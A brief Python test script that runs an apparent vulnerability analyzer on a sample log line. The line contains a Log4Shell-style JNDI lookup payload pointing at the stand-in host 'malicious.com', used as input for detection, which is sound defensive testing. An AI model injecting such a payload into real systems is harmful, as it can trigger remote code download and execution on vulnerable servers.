from pipeline.models.vulnerability_analyzer import VulnerabilityAnalyzer

import logging
logging.basicConfig(level=logging.INFO)

analyzer = VulnerabilityAnalyzer()

print("Testing vulnerability analysis (Log4j 2)...")
result = analyzer.analyze_vulnerability(
    vuln_type="Novel Log4j Exploit",
    log_message="ERROR: User input was evaluated. Pattern found: ${jndi:ldap://malicious.com/novel_payload} in Headers."
)
print("Result:", result)
